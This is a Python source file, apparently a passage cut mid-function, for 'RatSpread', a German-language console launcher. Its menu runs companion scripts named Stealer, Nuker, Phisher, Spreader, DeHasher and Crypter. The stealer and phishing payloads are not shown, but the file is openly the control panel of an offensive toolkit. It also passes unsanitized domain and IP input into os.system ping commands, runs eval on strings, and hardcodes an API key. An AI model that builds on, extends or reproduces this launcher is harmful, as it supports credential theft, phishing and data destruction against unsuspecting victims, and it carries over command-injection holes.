import os
import subprocess
import time
import traceback
import datetime
from datetime import datetime
import sys
import locale
import platform
import importlib
import random

#-------------------
#True = An
#False = Aus 
#-------------------

Version = "0.1.9"

DEBUG_MODE = False #Eingabe: 99
STREAMER_MODE = False #Eingabe: 100
DARKMODE = True #Bitte... bei allem was heilig ist.... lass den Darkmode an
Show_Ascii = True #Eingabe: 200
Show_Welcomme = True #Eingabe: 250
Light_mode = False #Eingabe: 300 mit light ist Leicht gemeint
DoNotChangeColor = True
SCRIPT_CHECK_ENABLED = False

threshold_temp = 20

onlyprint = "" 

system_speed = 1.5
default_system_speed = 0.003

Show_Streamermode = True
Show_Debugmode = True
Show_Version =  True
Show_Welcomme = True

start_stealer = None
Rat_crypter = None
Rat_encrypter = None
Rat_setup = None
Rat_phisher = None
Rat_spreader = None
Rat_save_yt = None
Rat_create = None 

today_date = datetime.now().strftime("%d.%m.%Y")
aktuelle_zeit = time.strftime("%H:%M")
current_os = platform.system().lower()

bg_white = '\033[47m'

if  DARKMODE is True:
    end = '\033[0m'
    red = '\033[91m'
    blue = '\033[94m'
    green = '\033[92m'
    white = '\033[97m'
    dgreen = '\033[32m'
    yellow = '\033[93m'
    back = '\033[7;91m'
    run = '\033[97m[~]\033[0m'
    que = '\033[94m[?]\033[0m'
    bad = '\033[91m[!]\033[0m'
    info = '\033[93m[i]\033[0m'
    debug_symbol = '\033[92m[</>]\033[0m'
    good = '\033[92m[🗸]\033[0m'
    not_loadet = '\033[91m[✗]\033[0m'
    loadet = '\033[92m[🗸]\033[0m'
else: 
    end = f'{bg_white}'
    red = f'{bg_white}'
    blue = f'{bg_white}'
    green = f'{bg_white}'
    white = f'{bg_white}'
    dgreen = f'{bg_white}'
    yellow = f'{bg_white}'
    back = f'{bg_white}'
    run = f'{bg_white}[~]'
    que = f'{bg_white}[?]'
    bad = f'{bg_white}[✗]'
    info = f'{bg_white}[!]'
    debug_symbol = f'{bg_white}[</>]'
    good = f'{bg_white}[🗸]'
    not_loadet = f'{bg_white}[✗]'
    loadet = f'{bg_white}[🗸]'

main_color_theme = f"{white}"

Secondary_color_theme = f"{yellow}"                                                                                                                                                                                                                                                                                                                     

Script_status_color_found = f"{white}"

Script_status_color_not_found = f"{red}"

options_color = f"{white}"

normal_input = f"{main_color_theme}Bitte wähle eine Option: {Secondary_color_theme}"

lightmode_input = f"You sick Bastard: "

def Start():
    if Light_mode is True:
        force_clear()
        color()
    elif DARKMODE is False:
        color()
        clear()
        Whitemode_color()
        start_titles()
        version()
        show_debug()
        show_streamer()
        willkommen()
        weather()
    else:
        clear()
        color()
        start_titles()
        version()
        show_debug()
        show_streamer()
        willkommen()
        weather()
    
def rat_pause():
    os.system("pause")

def rat_repeat(command_list, times):
    commands = command_list.split(", ")
    for _ in range(times):
        for command in commands:
            eval(command)

def rat_print(message):
    if onlyprint == "":
        print(f"{main_color_theme}{message}")
        sleep(default_system_speed)
    else:
        print(f"{main_color_theme}{onlyprint}")
        sleep(default_system_speed)

def rat_print_wait(message, time):
    rat_print(f"{message}")
    sleep(time)

def rat_print_pause(message):
    rat_print(f"{message}")
    rat_pause()

def rat_print_error(message):
    rat_print(f"{main_color_theme}{message}")
    time.sleep(system_speed)

def clear():
    if not DEBUG_MODE:
        os.system("cls" if os.name == "nt" else "clear")

def force_clear():
    os.system("cls" if os.name == "nt" else "clear")

def Whitemode_color():
    if DARKMODE is False:
        os.system("color f0")

def color():
    if DoNotChangeColor is False:
        if os.name == "nt":
            if DEBUG_MODE is True:
                os.system("color 0f")
            else:
                os.system("color 0a")

def start_titles():
    if Show_Ascii is True:
        rat_print(f"{main_color_theme}{RatSpreadVars.ascii}")
        rat_print(f"{main_color_theme}{RatSpreadVars.titel}")
    else:
        return

def show_ascii():
        global Show_Ascii
        if Show_Ascii is True:
            debug("Ascii Art deaktiviert")
            Show_Ascii = False
        elif Show_Ascii is False:                        
            debug("Asci Art aktiviert")
            Show_Ascii = True 

def show_debug():
    global show_debug
    if Show_Debugmode is True:
        if DEBUG_MODE is True:
            rat_print(f"{main_color_theme}Debug Modus: {Secondary_color_theme}Aktiv{end}")
    if Show_Debugmode is False:
        return
    if show_streamer and STREAMER_MODE is True:
        space(1)

def sleep(settime):
    time.sleep(settime)

def Abstand():
    rat_print(" ")

def space(Value):
    global space
    if Value == 1:
        Abstand()
    elif Value == 2:
        rat_repeat(f"Abstand()", 2)
    elif Value == 3:
        rat_repeat(f"Abstand()", 3)

def show_streamer():
    if Show_Streamermode is True:
        if STREAMER_MODE is True:
            rat_print(f"{main_color_theme}Streamer Modus: {Secondary_color_theme}Aktiv{end}") 
    if Show_Streamermode is False:
        return 

def version():
    if Show_Version is True:
        rat_print(f"{main_color_theme}RatSpread Version: {Secondary_color_theme}{Version}")
    if show_debug and DEBUG_MODE is True:
        space(1)
    else: 
        return

def weather():
    weather_info = get_weather()
    if weather_info:
        rat_print(weather_info)
        rat_print(" ")

def format_value(text):
    try:
        value = float(text)
        return f"{Secondary_color_theme}{text}{main_color_theme}"
    except ValueError:
        if text in ["True", "False", "true", "false"]:
            return f"{Secondary_color_theme}{text}{main_color_theme}"
        return text

def debug(text):
    global debug
    if DEBUG_MODE is True:
        formatted_text = " ".join([format_value(word) for word in text.split()])

        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
        rat_print(f"{blue}{current_time}{end} {debug_symbol} {main_color_theme}{formatted_text}{end}")
        sleep(4)

Placeholder = r""" 
______      _   _____                          _      
| ___ \    | | /  ___|                        | |     
| |_/ /__ _| |_\ `--. _ __  _ __ ___  __ _  __| |     
|    // _` | __|`--. \ '_ \| '__/ _ \/ _` |/ _` |     
| |\ \ (_| | |_/\__/ / |_) | | |  __/ (_| | (_| |     
\_| \_\__,_|\__\____/| .__/|_|  \___|\__,_|\__,_|     
                     | |                              
                     |_|                              
______ _                _           _     _           
| ___ \ |              | |         | |   | |          
| |_/ / | __ _  ___ ___| |__   ___ | | __| | ___ _ __ 
|  __/| |/ _` |/ __/ _ \ '_ \ / _ \| |/ _` |/ _ \ '__|
| |   | | (_| | (_|  __/ | | | (_) | | (_| |  __/ |   
\_|   |_|\__,_|\___\___|_| |_|\___/|_|\__,_|\___|_|"""

try:
    import RatSpreadVars
except ImportError:
    debug("RatSpreadVars konnte nicht importiert werden. Verwende Platzhalter.")
    time.sleep(2)
    class RatSpreadVars:
        ascii = f"{Placeholder}"
        titel = "=== RatSpread Menu ==="
        RatSave_titel = f"{Placeholder}"

try:
    import Settings
    username = getattr(Settings, 'username', 'DefaultUser')
    city = getattr(Settings, 'city', 'DefaultCity')
    birthday = getattr(Settings, 'birthday', '01.01.1900')
    api_key = getattr(Settings, 'api_key', '41f0e608343eaec9c51769c4b41c019a')
    shortcuts = getattr(Settings, 'shortcuts', {
        1: "https://www.google.at",
        2: "https://www.github.com",
        3: "test.txt", 
        4: "https://www.stackoverflow.com",
        5: "https://www.python.org",
        6: "/path/to/anotherfile.txt",  
        7: "https://www.wikipedia.org",
        8: "https://www.bing.com",
        9: "https://www.example.com",
        10: "https://www.reddit.com"
    })
except ImportError:
    debug("Settings konnte nicht importiert werden. Verwende Platzhalter.")
    time.sleep(2)
    class Settings:
        username = 'DefaultUser'
        city = 'Salzburg'
        birthday = '01.01.1900'
        api_key = '41f0e608343eaec9c51769c4b41c019a'
        shortcuts = {
            1: "https://www.google.at",
            2: "https://www.github.com",
            3: "test.txt", 
            4: "https://www.stackoverflow.com",
            5: "https://www.python.org",
            6: "/path/to/anotherfile.txt",  
            7: "https://www.wikipedia.org",
            8: "https://www.bing.com",
            9: "https://www.example.com",
            10: "https://www.reddit.com"
        }
    
    username = Settings.username
    city = Settings.city
    birthday = Settings.birthday
    api_key = Settings.api_key
    shortcuts = Settings.shortcuts

required_packages = [
    "requests",
    "whois",
    "six",
    "dateutil",
    "importlib",
    "threading",
    "webbrowser",
    "platform",
    "shutil"
]

def install_packages_if_needed(packages):
    for package in packages:
        try:
            importlib.import_module(package)
            debug(f" {package} ist installiert.")
        except ImportError:
            debug(f" {package} wird nicht gefunden und wird jetzt installiert...")
            try:
                subprocess.check_call([sys.executable, "python", "-m", "install", "--upgrade", "pip"])
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                debug(f" {package} wurde erfolgreich installiert.")
            except subprocess.CalledProcessError as e:
                debug(f"[ERROR] Installation von {package} fehlgeschlagen: {e}")

def upgrade_six_if_needed():
    try:
        six_version = importlib.import_module('six').__version__
        debug(f" Gefundene 'six' Version: {six_version}")
        if six_version < "1.15.0": 
            debug(" Upgrade von 'six' wird durchgeführt...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "six"])
            debug(" 'six' wurde erfolgreich auf die neueste Version aktualisiert.")
    except ImportError:
        debug(" 'six' ist nicht installiert. Installation wird durchgeführt...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "six"])

install_packages_if_needed(required_packages)
upgrade_six_if_needed()

try:
    import requests
    import whois
    import six
    import dateutil
    import importlib
    import threading
    import os
    import webbrowser
    import platform
    import shutil
except ImportError as e:
    print(f"[ERROR] Ein Fehler ist beim Importieren der Pakete aufgetreten: {e}")

import threading
def error(message):
    global error
    rat_print(f"{bad}: {message}")
    sleep(2)

def debug_switch():
        global DEBUG_MODE
        if DEBUG_MODE is True:
            debug("Debug modus deaktiviert")
            DEBUG_MODE = False
        elif DEBUG_MODE is False:
            debug("Debug modus aktiviert")
            DEBUG_MODE = True

def streamer_Switch():
        global STREAMER_MODE
        if STREAMER_MODE is True:
            debug("Streamer modus deaktiviert")
            STREAMER_MODE = False
        elif STREAMER_MODE is False:
            debug("Streamer modus aktiviert")
            STREAMER_MODE = True 

def show_wellcome():
        global Show_Welcomme
        if Show_Welcomme is True:
            debug("Wilkommens anzeigen deaktiviert")
            Show_Welcomme = False
        elif Show_Welcomme is False:                        
            debug("Willkommens anzeigen aktiviert")
            Show_Welcomme = True 

def lightmode_switch():
        global Light_mode
        if Light_mode is True:
            debug("Light Mode deaktiviert")
            Light_mode = False
        elif Light_mode is False:
            debug("Light Mode aktiviert")
            Light_mode = True

def find_script(script_name):
    for root, dirs, files in os.walk("."):
        if script_name in files:
            return os.path.join(root, script_name)
    return None

def check_script_executable(script_path):
    if not script_path:
        return False
    try:
        result = subprocess.run(["python", script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
        return result.returncode == 0
    except Exception as e:
        rat_print(f"{bad} Fehler beim Ausführen des Skripts {script_path}: {e}")
        return False

def get_weather():
    if not city:
        return "Stadt nicht gesetzt."

    url = f"http://api.openweathermap.org/data/2.5/forecast?q={city}&units=metric&appid={api_key}"
    try:
        response = requests.get(url)
        data = response.json()
    except Exception as e:
        return f"{bad} Fehler bei der API-Anfrage: {e}"

    if response.status_code != 200:
        return f"{bad} Fehler bei der API-Anfrage: {data.get('message', 'Unbekannter {bad} Fehler')}"
    
    if 'list' in data:
        current_temp = data['list'][0]['main']['temp']
        current_time = datetime.fromtimestamp(data['list'][0]['dt'])
        exceed_time = None

        for forecast in data['list']:
            temp = forecast['main']['temp']
            forecast_time = datetime.fromtimestamp(forecast['dt'])

            if temp > threshold_temp:
                exceed_time = forecast_time
                break

        if STREAMER_MODE is False:
            temp_info = f"{main_color_theme}Aktuelle Temperatur in {Secondary_color_theme}{city}{main_color_theme}: {green}{current_temp}{main_color_theme}°C um {Secondary_color_theme}{current_time.strftime('%H:%M')}{end}"
            if exceed_time:
                temp_info += f"\n{main_color_theme}Die Temperatur wird voraussichtlich {green}{threshold_temp}{main_color_theme}°C überschreiten am {dgreen}{exceed_time.strftime(f'%d.%m.%Y {main_color_theme}um {Secondary_color_theme}%H:%M')}{main_color_theme}.{end}"
            else:
                temp_info += f"\n{main_color_theme}Die Temperatur wird in den nächsten 5 Tagen voraussichtlich nicht {threshold_temp}{main_color_theme}°C überschreiten."

        if STREAMER_MODE is True:
            temp_info = f"{main_color_theme}Aktuelle Temperatur in {Secondary_color_theme}Zensiert{main_color_theme}: {green}{current_temp}{main_color_theme}°C um {Secondary_color_theme}{current_time.strftime('%H:%M')}{end}"
            if exceed_time:
                temp_info += f"\n{main_color_theme}Die Temperatur wird voraussichtlich {green}{threshold_temp}{main_color_theme}°C überschreiten am {dgreen}{exceed_time.strftime(f'%d.%m.%Y {main_color_theme}um {Secondary_color_theme}%H:%M')}{main_color_theme}.{end}"
            else:
                temp_info += f"\n{main_color_theme}Die Temperatur wird in den nächsten 5 Tagen voraussichtlich nicht {green}{threshold_temp}{main_color_theme}°C überschreiten."

        return temp_info
    else:
        return f"{bad} Fehler: Keine Vorhersagedaten gefunden."

def initialize_scripts():
    global start_stealer, Rat_crypter, Rat_encrypter, Rat_setup, Rat_phisher, Rat_spreader, Rat_nuker, Rat_crawler, Rat_dehasher, Rat_save, Rat_save_yt, Rat_create

    start_stealer = find_script("start_stealer_win.bat")
    Rat_crypter = find_script("Ratcodierung.py")
    Rat_encrypter = find_script("Ratuncode.py")
    Rat_setup = find_script("start_setup.py")
    Rat_phisher = find_script("RatPhisher.py")
    Rat_spreader = find_script("RatSpreader.py")
    Rat_nuker = find_script("RatSpreadSystemNuker.py")
    Rat_crawler = find_script("RatCrawler.py")
    Rat_dehasher = find_script("RatDeHasher.py")
    Rat_save = find_script("RatSave.py")  
    Rat_save_yt = find_script("RatSave_yt.py")  
    Rat_create = find_script("RatCreate.py")  

    if SCRIPT_CHECK_ENABLED:
        start_stealer_executable = current_os == "windows" and bool(start_stealer)
        rat_crypter_executable = check_script_executable(Rat_crypter)
        rat_encrypter_executable = check_script_executable(Rat_encrypter)
        rat_setup_executable = check_script_executable(Rat_setup)
        rat_phisher_executable = check_script_executable(Rat_phisher)
        rat_spreader_executable = check_script_executable(Rat_spreader)
        rat_nuker_executable = check_script_executable(Rat_nuker)
        rat_crawler_executable = check_script_executable(Rat_crawler)
        rat_dehasher_executable = check_script_executable(Rat_dehasher)
        rat_save_executable = check_script_executable(Rat_save)  
        rat_save_yt_executable = check_script_executable(Rat_save_yt)  
        rat_create_executable = check_script_executable(Rat_create)  
    else:
        start_stealer_executable = bool(start_stealer)
        rat_crypter_executable = bool(Rat_crypter)
        rat_encrypter_executable = bool(Rat_encrypter)
        rat_setup_executable = bool(Rat_setup)
        rat_phisher_executable = bool(Rat_phisher)
        rat_spreader_executable = bool(Rat_spreader)
        rat_nuker_executable = bool(Rat_nuker)
        rat_crawler_executable = bool(Rat_crawler)
        rat_dehasher_executable = bool(Rat_dehasher)
        rat_save_executable = bool(Rat_save) 
        rat_save_yt_executable = bool(Rat_save_yt)
        rat_create_executable  = bool(Rat_create)

    return {
        "start_stealer": start_stealer_executable,
        "Rat_crypter": rat_crypter_executable,
        "Rat_encrypter": rat_encrypter_executable,
        "Rat_setup": rat_setup_executable,
        "Rat_phisher": rat_phisher_executable,
        "Rat_spreader": rat_spreader_executable,
        "Rat_nuker": rat_nuker_executable,
        "Rat_crawler": rat_crawler_executable,
        "Rat_dehasher": rat_dehasher_executable,
        "Rat_save": rat_save_executable,
        "Rat_save_yt": rat_save_yt_executable,
        "Rat_create": rat_create_executable
    }

def rat_print_menu(script_status):

#==========================================    
    Start() #Start Anzeige, Ascii, etc
#==========================================

    def mark_script(name, status):
        if status:
            return f"{loadet}{Script_status_color_found}{name}"
        else:
            return f"{not_loadet}{Script_status_color_not_found} {name}"

    rat_print(mark_script('Stealer', script_status['start_stealer']))
    rat_print(mark_script('Nuker', script_status['Rat_nuker']))
    rat_print(mark_script('Crawler', script_status['Rat_crawler']))
    rat_print(mark_script('DeHasher', script_status['Rat_dehasher']))
    rat_print(mark_script('Crypter', script_status['Rat_crypter']))
    rat_print(mark_script('Encrypter', script_status['Rat_encrypter']))
    rat_print(mark_script('Setup', script_status['Rat_setup']))
    rat_print(mark_script('Phisher', script_status['Rat_phisher']))
    rat_print(mark_script('RatSave', script_status['Rat_save'])) 
    rat_print(mark_script('RatSave YT', script_status['Rat_save_yt'])) 
    rat_print(mark_script('RatCreate', script_status['Rat_create'])) 
    rat_print(" ")

    for key, value in menu_options.items():
        rat_print(f"{options_color}{key}: {value}")

def willkommen():
    global show_wellcome, Show_Welcomme
    if Show_Welcomme is True:
        rat_print(" ")
        try:
            stunde = int(time.strftime("%H"))
        except ValueError:
            stunde = 12  

        try:
            locale.setlocale(locale.LC_TIME, 'de_DE.UTF-8')
        except locale.Error:
            locale.setlocale(locale.LC_TIME, '')  

        wochentag = datetime.now().strftime("%A")
        if 5 <= stunde < 12:
            gruß = "Guten Morgen"
            grußend = "Morgens"
        elif 12 <= stunde < 18:
            gruß = "Guten Tag"
            grußend = " "
        else:
            gruß = "Guten Abend"
            grußend = "Abends"

        geburtstag = get_birthday()
        if geburtstag and geburtstag == today_date:
            gruß = f"{main_color_theme}Herzlichen Glückwunsch zum Geburtstag, {Secondary_color_theme}{username}!"
        if STREAMER_MODE is True:
            rat_print(f"{main_color_theme}{gruß}, {Secondary_color_theme}Zensiert!{main_color_theme} Heute ist {Secondary_color_theme}{wochentag}{main_color_theme} der {green}{today_date}")
        else:
            rat_print(f"{main_color_theme}{gruß}, {Secondary_color_theme}{username}{main_color_theme}! Heute ist {Secondary_color_theme}{wochentag}{main_color_theme} der {green}{today_date}")
        rat_print(f"{main_color_theme}Wir haben {Secondary_color_theme}{aktuelle_zeit}{main_color_theme} Uhr {grußend}")
    else:
        return

def get_birthday():
    try:
        with open('Settings.py', 'r') as settings_file:
            for line in settings_file:
                if line.startswith('birthday'):
                    return line.split('=')[1].strip().strip("'").strip('"')
    except FileNotFoundError:
        return None
    except IOError as e:
        error_menu(f"{bad} Fehler beim Lesen der Datei: {e}")

def set_birthday(date):
    global birthday
    birthday = date
    try:
        with open('Settings.py', 'a') as settings_file:
            settings_file.write(f"\nbirthday = '{date}'\n")
    except IOError as e:
        error_menu(f"{bad} Fehler beim Schreiben der Datei: {e}")

def RatStealer():
    if start_stealer:
        debug("Stealer-Skript wird ausgeführt")
        try:
            if current_os == "windows":
                subprocess.run(["cmd", "/c", "call", start_stealer], check=True)
            else:
                subprocess.run(["bash", start_stealer], check=True)
        except subprocess.CalledProcessError as e:
            error_menu(f"{bad} Fehler beim Ausführen des Stealer-Skripts: {e}")
    else:
        debug("Stealer-Skript nicht gefunden.")
        rat_print_error("start_stealer_win.bat konnte nicht gefunden werden.")
def RatNuker():
    if Rat_nuker:
        debug("Nuker-Skript wird ausgeführt")
        try:
            subprocess.run(["python", Rat_nuker], check=True)
        except subprocess.CalledProcessError as e:
            error_menu(f"{bad} Fehler beim Ausführen des Nuker-Skripts: {e}")
    else:
        debug("Nuker-Skript nicht gefunden.")
        rat_print_error("RatSpreadSystemNuker.py konnte nicht gefunden werden.")

def RatCrawler():
    if Rat_crawler:
        debug("Crawler-Skript wird ausgeführt")
        try:
            subprocess.run(["python", Rat_crawler], check=True)
        except subprocess.CalledProcessError as e:
            error_menu(f"{bad} Fehler beim Ausführen des Crawler-Skripts: {e}")
    else:
        debug("Crawler-Skript nicht gefunden.")
        rat_print("RatCrawler.py konnte nicht gefunden werden.")

def RatDehasher():
    if Rat_dehasher:
        debug("DeHasher-Skript wird ausgeführt")
        clear()
        try:
            subprocess.run(["python", Rat_dehasher], check=True)
        except subprocess.CalledProcessError as e:
            error_menu(f"{bad} Fehler beim Ausführen des DeHasher-Skripts: {e}")
    else:
        debug("DeHasher-Skript nicht gefunden.")
        rat_print_error("RatDeHasher.py konnte nicht gefunden werden.")

def verschluesselungs_menu():
    debug("Verschlüsselungsmenü aufgerufen")

    verschluesselungs_menu_options = {
        1: "Verschlüsseln",
        2: "Entschlüsseln",
        3: "Zurück zum Hauptmenü"
    }

    while True:
        rat_print("\nVerschlüsselungsmenü:")
        for key, value in verschluesselungs_menu_options.items():
            rat_print(f"{key}: {value}")

        try:
            if DARKMODE is False:
                option = int(input(f'{lightmode_input}'))
            else:
                option = int(input(f'{normal_input}'))
            if option == 1:
                RatCrypter()
            elif option == 2:
                RatEnCrypter()
            elif option == 3:
                debug("Zurück zum Hauptmenü")
                break
            else:
                debug(f"Ungültige Option im Verschlüsselungsmenü ausgewählt: {option}")
                rat_print_error('Ungültige Option. Bitte eine Zahl zwischen 1 und 3 eingeben.')
        except ValueError:
            debug("Ungültige Eingabe im Verschlüsselungsmenü: keine Zahl")
            rat_print_error('Ungültige Eingabe. Bitte eine Zahl eingeben ...')
        except Exception as e:
            error_menu(str(e))

def RatCrypter():
    if Rat_crypter:
        debug("Verschlüsselungs-Skript wird ausgeführt")
        try:
            subprocess.run(["python", Rat_crypter], check=True)
        except subprocess.CalledProcessError as e:
            error_menu(f"{bad} Fehler beim Ausführen des Verschlüsselungs-Skripts: {e}")
    else:
        debug("Verschlüsselungs-Skript nicht gefunden.")
        rat_print_error("Ratcodierung.py konnte nicht gefunden werden.")

def RatEnCrypter():
    if Rat_encrypter:
        debug("Entschlüsselungs-Skript wird ausgeführt")
        try:
            subprocess.run(["python", Rat_encrypter], check=True)
        except subprocess.CalledProcessError as e:
            error_menu(f"{bad} Fehler beim Ausführen des Entschlüsselungs-Skripts: {e}")
    else:
        debug("Entschlüsselungs-Skript nicht gefunden.")
        rat_print_error("Ratuncode.py konnte nicht gefunden werden.")

def RatSetup():
    if Rat_setup:
        debug("Setup-Skript wird ausgeführt")
        try:
            subprocess.run(["python", Rat_setup], check=True)
        except subprocess.CalledProcessError as e:
            error_menu(f"{bad} Fehler beim Ausführen des Setup-Skripts: {e}")
    else:
        debug("Setup-Skript nicht gefunden.")
        rat_print_error("start_setup.py konnte nicht gefunden werden.")

def RatPhisher():
    if Rat_phisher:
        debug("Phisher-Skript wird ausgeführt")
        try:
            subprocess.run(["python", Rat_phisher], check=True)
        except subprocess.CalledProcessError as e:
            error_menu(f"{bad} Fehler beim Ausführen des Phisher-Skripts: {e}")
    else:
        debug("Phisher-Skript nicht gefunden.")
        rat_print_error("RatPhisher.py konnte nicht gefunden werden.")

def RatSave_menu():
    debug("RatSave aufgerufen")

    RatSave_menu_options = {
        1: "RatSave (StreamTape)",
        2: "RatSave (Youtube)",
        3: "Zurück zum Hauptmenü"
    }
    while True:
        clear()
        rat_print(f"{RatSpreadVars.RatSave_titel}")
        rat_print("\nRatSave Menu:")
        for key, value in RatSave_menu_options.items():
            rat_print(f"{key}: {value}")
        try:
            if DARKMODE is False:
                option = int(input(f'{lightmode_input} '))
            else:
                option = int(input(f'{normal_input} '))

            if option == 1:
                RatSave()
            elif option == 2:
                RatSave_yt()
            elif option == 3:
                debug("Zurück zum Hauptmenü")
                break
            else:
                debug(f"Ungültige Option im Verschlüsselungsmenü ausgewählt: {option}")
                rat_print_error('Ungültige Option. Bitte eine Zahl zwischen 1 und 3 eingeben.')
        except ValueError:
            debug("Ungültige Eingabe im Verschlüsselungsmenü: keine Zahl")
            rat_print_error('Ungültige Eingabe. Bitte eine Zahl eingeben ...')
        except Exception as e:
            error_menu(str(e))
def RatSave():
    if Rat_save:
        debug("RatSave-Skript wird ausgeführt (StreamTape)")
        try:
            subprocess.run(["python", Rat_save], check=True)
        except subprocess.CalledProcessError as e:
            error_menu(f"{bad} Fehler beim Ausführen des RatSave-Skripts: {e}")
    else:
        debug("RatSave-Skript nicht gefunden.")
        rat_print_error("RatSave.py konnte nicht gefunden werden.")

def RatSave_yt():
    if Rat_save_yt:
        debug("RatSave-Skript wird ausgeführt (Youtube)")
        try:
            subprocess.run(["python", Rat_save_yt], check=True)
        except subprocess.CalledProcessError as e:
            error_menu(f"{bad} Fehler beim Ausführen des RatSave-Skripts: {e}")
    else:
        debug("RatSave-Skript nicht gefunden.")
        rat_print_error("RatSave_yt.py konnte nicht gefunden werden.")

def RatCreate():
    if Rat_create:
        debug("RatCreate-Skript wird ausgeführt")
        try:
            subprocess.run(["python", Rat_create], check=True)
        except subprocess.CalledProcessError as e:
            error_menu(f"{bad} Fehler beim Ausführen des RatCreate-Skripts: {e}")
    else:
        debug("RatCreate-Skript nicht gefunden.")
        rat_print_error("RatCreate.py konnte nicht gefunden werden.")

menu_options = {
    1: "Stealer starten",
    2: "Nuker starten",
    3: "Crawler starten",
    4: "DeHasher starten",
    5: "Verschlüsselungsmenü starten",
    6: "Setup starten",
    7: "Phisher starten",
    8: "RatSaveMenu starten", 
    9: "RatCreate starten", 
    10: "Beenden" 
}

def error_menu(error_message):
    import traceback
    import sys
    import datetime
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    exc_type, exc_value, exc_traceback = sys.exc_info()
    traceback_details = ''.join(traceback.format_tb(exc_traceback))

    error_report = f"""
    Fehlerbericht:
    Zeit: {timestamp}
    Fehlerart: {exc_type.__name__}
    Fehlernachricht: {error_message}
    Traceback:
    {traceback_details}
    """

    debug(f"{bad} Fehler aufgetreten: {error_message}")
    
    clear()
    color()

    rat_print(f"Ein {bad} Fehler ist aufgetreten:")
    rat_print(f"{error_message}")
    rat_print("\nDetaillierter Fehlerbericht:")
    rat_print(error_report) 

    input("Drücke Enter, um fortzufahren...")

    with open("error_log.txt", "a") as log_file:
        log_file.write(error_report)

def loading_screen(stop_event):
    while not stop_event.is_set():
        for char in "|/-\\":
            print(f"{main_color_theme}Überprüfe Verfügbarkeit... {char}", end="\r")
            time.sleep(0.2)

def check_domain_availability(domain):
    rat_print(f"{main_color_theme}Überprüfe die Verfügbarkeit der Domain: {Secondary_color_theme}{domain}")
    stop_event = threading.Event()
    loading_thread = threading.Thread(target=loading_screen, args=(stop_event,))
    loading_thread.start()

    response = os.system(f"ping {domain} > nul")

    stop_event.set()
    loading_thread.join()

    if response == 0:
        rat_print(f"{red}[Nicht Kaufbar]{main_color_theme} Die Domain {Secondary_color_theme}{domain}{main_color_theme} ist erreichbar {Secondary_color_theme}(nicht kaufbar){main_color_theme}.")
        sleep(5)
    else:
        rat_print(f"{green}[Kaufbar]{main_color_theme} Die Domain {Secondary_color_theme}{domain}{main_color_theme} ist nicht erreichbar {Secondary_color_theme}(warscheinlich kaufbar){main_color_theme}.")
        sleep(5)

def loading_screen_ping(stop_event):
    while not stop_event.is_set():
        for char in "|/-\\":
            rat_print(f"{main_color_theme}Pinge {Secondary_color_theme}{IP}{main_color_theme} {char}{end}", end="\r")
            time.sleep(0.2)

def pingdomain(IP):
    rat_print(f"{main_color_theme}Pingen der IP-Adresse: {Secondary_color_theme}{IP}{main_color_theme}...{end}")
    stop_event = threading.Event()
    loading_thread = threading.Thread(target=loading_screen_ping, args=(stop_event,))
    loading_thread.start()

    response = os.system(f"ping {IP} > nul")

    stop_event.set()
    loading_thread.join()

    if response == 0:
        rat_print(f"{green}[Erreichbar]{main_color_theme} Die IP-Adresse {Secondary_color_theme}{IP}{main_color_theme} ist erreichbar.{end}")
        sleep(5)
    else:
        rat_print(f"{red}[Nicht Erreichbar]{main_color_theme} Die IP-Adresse {Secondary_color_theme}{IP}{main_color_theme} ist nicht erreichbar.{end}")
        sleep(5)

def is_firefox_installed():
    if platform.system() == 'Windows':
        return shutil.which("firefox") is not None
    elif platform.system() == 'Darwin':
        return os.path.exists("/Applications/Firefox.app")
    else:
        return shutil.which("firefox") is not None

def open_with_firefox(url):
    try:
        if platform.system() == 'Windows' or platform.system() == 'Linux':
            subprocess.Popen(['firefox', url])
        elif platform.system() == 'Darwin':
            subprocess.Popen(['/Applications/Firefox.app/Contents/MacOS/firefox', url])
    except Exception as e:
        debug(f"Fehler beim Öffnen mit Firefox: {Secondary_color_theme}{e}")

def open_shortcut(number_str):
    try:
        number = int(number_str[1:])  
        if number in shortcuts:
            resource = shortcuts[number]
            rat_print(f"{main_color_theme}Öffne Shortcut #{number}: {Secondary_color_theme}{resource}")
            show_me(resource)
        else:
            rat_print(f"{bad} {main_color_theme}Kein Shortcut für #{number} gesetzt.")
    except ValueError:
        rat_print(f"{bad} {main_color_theme}Ungültiger Shortcut: {number_str}")

def show_shortcuts():
    rat_print(f"{main_color_theme}Verfügbare Shortcuts:")
    for number, resource in shortcuts.items():
        rat_print(f"{Secondary_color_theme}#{number}: {main_color_theme}{resource}")
        rat_pause()

def show_me(resource):
    url_suffixes = ('.com', '.net', '.de', '.at', '.eu')

    if resource.endswith(url_suffixes) or resource.startswith(('http://', 'https://', 'www.')):
        if not resource.startswith(('http://', 'https://')):
            resource = 'http://' + resource

        debug(f"Öffne die Website: {Secondary_color_theme}{resource}")
        rat_print(f"{main_color_theme}Öffne die Website: {Secondary_color_theme}{resource}")

        if is_firefox_installed():
            debug("Firefox erkannt. Öffne URL in Firefox.")
            open_with_firefox(resource)
        else:
            debug("Kein Firefox erkannt. Öffne URL im Standard-Browser.")
            webbrowser.open(resource)
    
    elif os.path.isfile(resource):
        rat_print(f"{main_color_theme}Öffne die Datei: {Secondary_color_theme}{resource}")
        try:
            if platform.system() == 'Windows':
                os.startfile(resource)
            elif platform.system() == 'Darwin':
                subprocess.call(('open', resource))
            else:
                subprocess.call(('xdg-open', resource))
        except Exception as e:
            rat_print_wait(f"{main_color_theme} Fehler beim Öffnen der Datei: {e}", 5)
    
    else:
        rat_print_pause(f"{bad} {main_color_theme}'{Secondary_color_theme}{resource}{main_color_theme}' ist weder eine gültige {Secondary_color_theme}URL {main_color_theme}noch eine vorhandene {Secondary_color_theme}Datei{main_color_theme}.")
    main_menu()

def change_color(option):
    global change_color, main_color_theme
    color_code = option.split()[-1]
    if os.name == "nt": 
        try:
            os.system(f"color {color_code}") 
            if color_code == "0a":
                main_color_theme = f"{green}"
            if color_code == "0f":
                main_color_theme = f"{white}"
            if color_code == "0c":
                main_color_theme = f"{red}"
            if color_code == "04":
                main_color_theme = f"{red}"
            if color_code == "0e":
                main_color_theme = f"{yellow}"
            debug(f"Farbe geändert zu: {color_code}")
        except Exception as e:
